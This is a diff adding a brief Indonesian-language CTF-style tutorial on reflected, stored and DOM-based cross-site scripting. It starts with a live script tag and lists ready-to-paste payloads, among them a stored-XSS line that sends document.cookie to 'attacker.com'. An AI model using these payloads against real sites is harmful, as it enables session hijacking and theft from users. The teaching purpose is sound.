@@ -1,0 +1,23 @@
+<script>alert('XSS')</script>
+
+
+
+
+Reflected XSS
+XSS Attack Diagram
+
+Script jahat dimasukkan via URL/form, langsung dipantulkan server ke browser.
+Cara pakai: Input <script>alert('XSS')</script> di search box ?q=test, alert muncul = sukses.
+Contoh CTF: http://ctf.local/search.php?q=<script>fetch('/flag.txt')</script> untuk ambil flag.
+Stored XSS
+
+Script disimpan permanen di database/server, berjalan setiap user buka halaman.
+Cara pakai: Masukkan <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> di kolom komentar/forum.
+Contoh CTF: Submit payload di guestbook, buka ulang halaman → curi session admin dapat flag.
+DOM-based XSS
+
+Serangan di sisi client, manipulasi DOM via JavaScript tanpa lewat server.
+Cara pakai: URL http://ctf.local/#<script>alert(1)</script>, JS ambil location.hash dan eval() langsung.
+Contoh CTF: page.html?data=<img src=x onerror=alert(document.cookie)>, DOM parser eksekusi payload.
+
+Pilih reflected dulu untuk pemula karena paling gampang dibuat (tanpa DB).
